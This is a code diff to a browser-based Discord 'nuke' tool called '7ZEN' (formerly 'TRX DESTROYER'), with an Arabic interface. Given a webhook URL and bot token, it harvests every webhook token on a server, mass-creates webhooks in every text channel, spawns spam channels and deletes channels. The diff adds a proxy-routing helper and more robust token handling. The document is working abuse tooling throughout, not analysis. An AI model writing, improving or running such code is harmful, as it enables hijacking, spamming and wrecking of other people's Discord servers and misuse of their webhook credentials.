@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>☣️ 7ZEN ☣️ · TRX DESTROYER</title>
+<title>☣️ 7ZEN ☣️</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'Segoe UI',Arial,sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
@@ -105,10 +105,25 @@ textarea{border-radius:16px;height:150px;margin-top:10px;background:#050505;colo
 <script>
 let R=false,S=false,N=0,TM=[],CH=[],WH=null,WHs=[];
 const AV='https://i.ibb.co/tkT3Lb6/F35-FD059-0-CD2-485-E-ABDF-11-B2-C814-C78-F.png';
-const UN=' ☣️ 7zen ☣️';
+const UN=' ☣️ 7zen';
 const $=i=>document.getElementById(i);
 const L=m=>{const e=$('log');e.value+=`[${new Date().toLocaleTimeString('ar-SA')}] ${m}\n`;e.scrollTop=e.scrollHeight};
 const QC=()=>{const q=document.querySelectorAll('.wu');let c=0;for(const e of q)if(e.value.trim())c++;$('whc').textContent=`(${c})`};
+
+async function FETCH_API(url, options = {}) {
+const px=$('px').value.trim();
+const targetUrl = px ? px + encodeURIComponent(url) : url;
+try {
+const r = await fetch(targetUrl, options);
+return r;
+} catch(e) {
+if(px) {
+// Fallback direct or via alternative proxy if available
+try { return await fetch(url, options); } catch(err) { throw e; }
+}
+throw e;
+}
+}
 
 async function SCAN(){
 const u=$('wh').value.trim();
@@ -117,8 +132,21 @@ const m=u.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
 if(!m){L('❌ رابط غير صالح');return}
 const id=m[1],tk=m[2];L('🔍 جاري الفحص...');
 try{
-const r=await fetch(`https://discord.com/api/webhooks/${id}/${tk}`,{method:'GET',headers:{'Content-Type':'application/json'}});
-if(!r.ok){L(`⚠️ CORS (${r.status})`);$('gi').textContent=id;$('wii').textContent=id;$('is').style.display='block';return}
+const r=await FETCH_API(`https://discord.com/api/webhooks/${id}/${tk}`,{method:'GET',headers:{'Content-Type':'application/json'}});
+if(!r.ok){
+// Try direct if proxy failed
+const r2 = await fetch(`https://discord.com/api/webhooks/${id}/${tk}`);
+if(!r2.ok){L(`⚠️ CORS (${r.status})`);$('gi').textContent=id;$('wii').textContent=id;$('is').style.display='block';return}
+const d2=await r2.json();WH=d2;
+$('gn').textContent=d2.name||'-';$('gi').textContent=d2.guild_id||'-';$('cn').textContent='-';$('ci').textContent=d2.channel_id||'-';$('wn').textContent=d2.name||'-';$('wii').textContent=d2.id||id;
+$('is').style.display='block';
+$('ow').innerHTML='<div class="note grn">✅ اضغط "جلب الكل" لسحب جميع ويبهوكات السيرفر</div>';
+const q=document.querySelectorAll('.wu');let f=false;
+for(const e of q){if(e.value.trim()===u){f=true;break}}
+if(!f){const q2=document.querySelector('.wu');if(q2&&!q2.value.trim())q2.value=u;else ADW(u)}
+L(`✅ ${d2.name||'OK'}`);QC();
+return;
+}
 const d=await r.json();WH=d;
 $('gn').textContent=d.name||'-';$('gi').textContent=d.guild_id||'-';$('cn').textContent='-';$('ci').textContent=d.channel_id||'-';$('wn').textContent=d.name||'-';$('wii').textContent=d.id||id;
 $('is').style.display='block';
@@ -136,34 +164,34 @@ function RM(b){const q=document.querySelectorAll('.wi');if(q.length<=1){L('⚠�
 function GA(){const q=document.querySelectorAll('.wu'),u=[];for(const e of q){const v=e.value.trim();if(v)u.push(v)}return u}
 
 async function FIND_ALL(){
-const tk=$('bt').value.trim(),px=$('px').value.trim();
+const tk=$('bt').value.trim();
 if(!tk){alert('حط بوت توكين');return}
 if(!WH||!WH.guild_id){alert('اضغط فحص أول');return}
 const gid=WH.guild_id;L('🔎 جلب جميع ويبهوكات السيرفر...');
 try{
-const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/webhooks`),{headers:{'Authorization':`Bot ${tk}`}});
+const r=await FETCH_API(`https://discord.com/api/v10/guilds/${gid}/webhooks`,{headers:{'Authorization':`Bot ${tk}`}});
 if(!r.ok){L(`❌ ${r.status}`);return}
 const data=await r.json();let c=0;
-for(const w of data){const wu=`https://discord.com/api/webhooks/${w.id}/${w.token}`;ADW(wu);c++}
+for(const w of data){if(w.token){const wu=`https://discord.com/api/webhooks/${w.id}/${w.token}`;ADW(wu);c++}}
 L(`✅ ${c} ويبهوك`);QC();
 }catch(e){L(`❌ ${e.message}`)}
 }
 
 async function ALL_CH(){
-const tk=$('bt').value.trim(),px=$('px').value.trim();
+const tk=$('bt').value.trim();
 if(!tk){alert('حط بوت توكين');return}
 if(!WH||!WH.guild_id){alert('اضغط فحص أول');return}
 const gid=WH.guild_id;L('📡 جلب جميع القنوات...');
 try{
-const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/channels`),{headers:{'Authorization':`Bot ${tk}`}});
+const r=await FETCH_API(`https://discord.com/api/v10/guilds/${gid}/channels`,{headers:{'Authorization':`Bot ${tk}`}});
 if(!r.ok){L(`❌ ${r.status}`);return}
 const channels=await r.json();const txtCh=channels.filter(c=>c.type===0);let sc=0;
 L(`📡 إنشاء ويبهوك في ${txtCh.length} قناة...`);
 for(const ch of txtCh){
-if(S)break
+if(S)break;
 try{
-const r2=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${ch.id}/webhooks`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'☣️ 7ZEN ☣️'})});
-if(r2.ok){const d=await r2.json();const wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;ADW(wu);sc++}
+const r2=await FETCH_API(`https://discord.com/api/v10/channels/${ch.id}/webhooks`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'☣️ 7ZEN ☣️'})});
+if(r2.ok){const d=await r2.json();if(d.token){const wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;ADW(wu);sc++}}
 }catch(e){}
 }
 L(`✅ ${sc} ويبهوك في كل القنوات`);QC();
@@ -171,7 +199,7 @@ L(`✅ ${sc} ويبهوك في كل القنوات`);QC();
 }
 
 async function CW(){
-const u=$('wh').value.trim(),tk=$('bt').value.trim(),px=$('px').value.trim();
+const u=$('wh').value.trim(),tk=$('bt').value.trim();
 if(!u){alert('حط رابط');return}
 if(!tk){alert('حط بوت توكين');return}
 const m=u.match(/discord\.com\/api\/webhooks\/(\d+)\/([A-Za-z0-9_-]+)/);
@@ -179,21 +207,21 @@ if(!m){L('❌ رابط غير صالح');return}
 if(!WH||!WH.channel_id){L('❌ اضغط فحص أول');return}
 const cid=WH.channel_id;L('🆕 إنشاء ويبهوك...');
 try{
-const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${cid}/webhooks`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'☣️ 7ZEN ☣️'})});
-if(r.ok){const d=await r.json();const wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;L('✅ تم');ADW(wu);$('wh').value=wu;QC()}
+const r=await FETCH_API(`https://discord.com/api/v10/channels/${cid}/webhooks`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:'☣️ 7ZEN ☣️'})});
+if(r.ok){const d=await r.json();if(d.token){const wu=`https://discord.com/api/webhooks/${d.id}/${d.token}`;L('✅ تم');ADW(wu);$('wh').value=wu;QC()}}
 else{const t=await r.text();L(`❌ ${r.status} ${t.slice(0,60)}`)}
 }catch(e){L(`❌ ${e.message}`)}
 }
 
 async function MKCH(){
-const tk=$('bt').value.trim(),px=$('px').value.trim();
+const tk=$('bt').value.trim();
 if(!tk){L('⚠️ مافي بوت');return false}
 if(!WH||!WH.guild_id){L('❌ اضغط فحص أول');return false}
 const gid=WH.guild_id;let sc=0;
 for(let i=0;i<5;i++){
 if(S)break;const nm=`☣️7zen☣️-${i+1}`;
 try{
-const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/guilds/${gid}/channels`),{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:nm,type:0})});
+const r=await FETCH_API(`https://discord.com/api/v10/guilds/${gid}/channels`,{method:'POST',headers:{'Content-Type':'application/json','Authorization':`Bot ${tk}`},body:JSON.stringify({name:nm,type:0})});
 if(r.ok){const d=await r.json();CH.push(d.id);sc++;L(`✅ #${nm}`)}
 else{break}
 }catch(e){break}
@@ -202,14 +230,14 @@ if(sc>0)L(`🔥 ${sc} روم 7ZEN`);return sc>0
 }
 
 async function RMCH(){
-const tk=$('bt').value.trim(),px=$('px').value.trim();
+const tk=$('bt').value.trim();
 if(CH.length===0)return
 if(!tk){L('⚠️ مافي بوت');return}
 L(`🗑️ حذف ${CH.length}...`);let d=0;
 for(const id of CH){
 if(S)break
 try{
-const r=await fetch(px+encodeURIComponent(`https://discord.com/api/v10/channels/${id}`),{method:'DELETE',headers:{'Authorization':`Bot ${tk}`}});
+const r=await FETCH_API(`https://discord.com/api/v10/channels/${id}`,{method:'DELETE',headers:{'Authorization':`Bot ${tk}`}});
 if(r.ok||r.status===404)d++
 }catch(e){}
 }
